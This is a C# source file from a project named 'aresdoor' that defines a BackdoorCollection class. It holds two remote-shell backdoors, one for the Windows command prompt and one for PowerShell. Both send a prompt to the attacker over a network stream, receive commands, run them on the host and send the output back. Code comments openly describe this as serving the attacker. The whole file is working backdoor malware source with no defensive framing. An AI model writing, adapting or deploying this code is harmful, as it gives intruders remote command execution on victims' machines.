using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace aresdoor
{
    class BackdoorCollection
    {
        NetworkCommunication nc = new NetworkCommunication();

        public bool CommandPromptBackdoor(NetworkStream stream)
        {
            while (true)
            {
                // Send shellcode to attacker
                nc.dataTravelTO(stream, System.IO.Directory.GetCurrentDirectory() + "> ");
                // Recieve response from client application
                string responseFromServer = nc.dataTravelFROM(stream);

                if (responseFromServer.Contains("cd"))
                    System.IO.Directory.SetCurrentDirectory(responseFromServer.Split(" ".ToCharArray())[1]);
                else if (responseFromServer.Contains("exit"))
                    return false;
                else
                    try { nc.dataTravelTO(stream, Misc.execCommandPrompt(responseFromServer)); } // Execute command and send output to attacker
                #if DEBUG
                    catch (Exception exc) { Console.WriteLine(exc); return false; }
                #else
                    catch (Exception) { nc.dataTravelTO(stream, "Command didn't execute."); return false; }
                #endif
            }

            return false; // Should we ever get here, it's probably because of an error.
        }

        public bool PowershellBackdoor(NetworkStream stream)
        {
            while (true)
            {
                // Send shellcode to attacker:
                nc.dataTravelTO(stream, "PS " + System.IO.Directory.GetCurrentDirectory() + "> ");
                // Recieve response from client application
                string responseFromServer = nc.dataTravelFROM(stream);

                if (responseFromServer.Contains("cd"))
                    System.IO.Directory.SetCurrentDirectory(responseFromServer.Split(" ".ToCharArray())[1]);
                else if (responseFromServer.Contains("exit"))
                    return false;
                else
                    try { nc.dataTravelTO(stream, Misc.execPowershellCommand(responseFromServer)); } // Execute command and send output to attacker
                #if DEBUG
                    catch (Exception exc) { Console.WriteLine(exc); return false; }
                #else
                    catch (Exception) { nc.dataTravelTO(stream, "Command didn't execute."); return false; }
                #endif
            }

            return false; // Should we ever get here, it's probably because of an error.
        }
    }
}
